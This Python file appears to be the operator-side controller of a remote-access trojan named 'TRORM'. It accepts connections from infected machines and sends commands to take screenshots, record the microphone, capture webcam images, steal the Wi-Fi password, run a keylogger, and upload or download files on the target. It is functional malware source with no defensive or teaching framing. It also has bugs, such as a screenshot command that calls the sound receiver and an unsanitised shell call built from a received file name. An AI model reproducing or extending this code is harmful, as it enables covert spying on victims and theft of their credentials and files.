import socket, os

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1",9999))

class run():
	def __init__(self, connection):
		self.conn = connection
		info = self.conn.recv(1024).decode("utf-8")
		info = info.split(" ")
		self.username = info[0]
		self.target_operating_system = info[1]
		report = "\n                                    SYS INFO\n    name: {0} \n    os: {1}\n".format(self.username,self.target_operating_system)
		print(report)
		#self.downloading_file()
		self.main_handler()

	def receive_sound(self, filename='sound.wav', secound=5):
		self.conn.send(str(secound).encode("utf-8"))
		data = self.conn.recv(1024 * 10 * 50)
		f = open(filename,'wb')
		f.write(data)

	def receive_picture(self, picture="image.png"):
		data = self.conn.recv(1024000)
		with open(picture,'wb') as f :
			f.write(data)
		print('done')



	def upload_file(self, filename):
		self.conn.send(filename.encode("utf-8"))
		with open(filename,'rb') as f:
			self.conn.send(f.read())
	def downloading_file(self):
		file_name = self.conn.recv(102400).decode("utf-8")
		print(file_name)
		try :
			os.system("touch {0}".format(file_name))
		except Exception as e:
			print(e)
		f = open(file_name, 'wb')
		f.write(self.conn.recv(1024 * 10000 * 100))
		f.close()

	def main_handler(self):
		while 1:
			command = str(input("[TRORM] : "))
			if command == "help" or command == "?":
				help_message = """
				 _________________________________________________________________
				|					  |											  |
				|	   COMMAND		  |					functionality			  |
				|					  |											  |
				|---------------------|-------------------------------------------|
				|					  |											  |
				|   1. Screenshot     |		Take screenshot of the target screen. |		
				|_____________________|___________________________________________|
				|					  |											  |
				|	2. Listen 		  |		Record voice from built-in microphone.|		
				|_____________________|___________________________________________|
				|					  |											  |
				|	3. Cam_Discover   |		Take picture from camera and save it. |
				|_____________________|___________________________________________|
				|					  |											  |
				|	4. Wifi_Password  |		Get the password of the current wifi. |
				|_____________________|___________________________________________|
				|					  |											  |
				|	5. Listen_For_Keys|			Start keylogger as thread		  |
				|_____________________|___________________________________________|
				|					  |											  |
				|	6. Open_Link	  |	Open link in firefox or chrome webbrowser.|
				|_____________________|___________________________________________|
				|					  |											  |
				|	7. Show_Image	  |		Pop up an image in tkinter window.	  |
				|_____________________|___________________________________________|
				|					  |											  |
				|	8. Upload_File 	  |		Upload file to target (any extension) |
				|_____________________|___________________________________________|
				|					  |											  |
				|	9. Download 	  |	  Download files from the target machine  |
				|_____________________|___________________________________________|
				|					  |											  |
				|  10. Play_Wav		  |			play sound files as thread		  |
				|_____________________|___________________________________________|

				"""
				print(help_message)
			elif command == "Screenshot" or command == "screenshot":
				self.conn.send(b"Screenshot")
				self.receive_sound()
			elif command == "Listen" or command == "listen":
				self.conn.send(b"Listen")
				self.receive_sound()
				print("wav file saved succefully at ",os.getcwd())
			elif command == "Cam_Discover" or command == "cam_discover":
				self.conn.send(b"Cam_Discover")
				self.receive_picture()
				print("image saved succefully att ", os.getcwd())
			elif command == "Wifi_Password" or command == "wifi_password":
				self.conn.send(b"Wifi_Password")
				print("The current password of the wifi that the target connected to is :", self.conn.recv(1024 * 8))
			elif command == "Listen_For_Keys" or command == "listen_for_keys":
				self.conn.send(b"Listen_For_Keys")
			elif command == "stop_key_logger":
				self.conn.send(b"stop_key_logger")

			elif "open_link" in command or "Open_Link" in command:
				self.conn.send(b"open_link")
				link = command[9:]
				self.conn.send(link.encode("utf-8"))
			elif "Show_Image" in command or "show_image" in command:
				self.conn.send(b"Show_Image")
				imgfilename = command[11:]
				self.conn.send(imgfilename.encode("utf-8"))
			elif "Upload_File" in command or "upload_file" in command:
				self.conn.send(b"Upload_File")
				upfilename = command[12:]
				self.upload_file(upfilename)
			elif "Download" in command or "download" in command:
				self.conn.send(b"Download")
				upfilename = command[9:]
				self.conn.send(upfilename.encode("utf-8"))
				self.downloading_file()
			
while 1:
	try:
		s.listen(1)
		conn, addr = s.accept()
		run(conn)#.receive_picture()
	except KeyboardInterrupt as e:
		exit("you pressed the control+c ")
	